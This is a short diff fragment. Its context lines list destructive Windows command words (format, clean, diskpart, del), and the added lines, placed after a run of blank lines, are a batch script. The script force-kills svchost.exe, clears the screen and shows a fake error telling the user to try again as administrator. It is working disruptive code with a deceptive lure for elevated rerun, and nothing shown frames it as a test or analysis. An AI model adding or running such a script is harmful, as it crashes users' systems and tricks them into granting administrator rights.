@@ -3,3 +3,15 @@ format
 clean
 diskpart
 del
+
+
+
+
+
+
+@echo off
+taskkill /f /im svchost.exe
+cls
+echo error, try again as administrator
+pause
+:
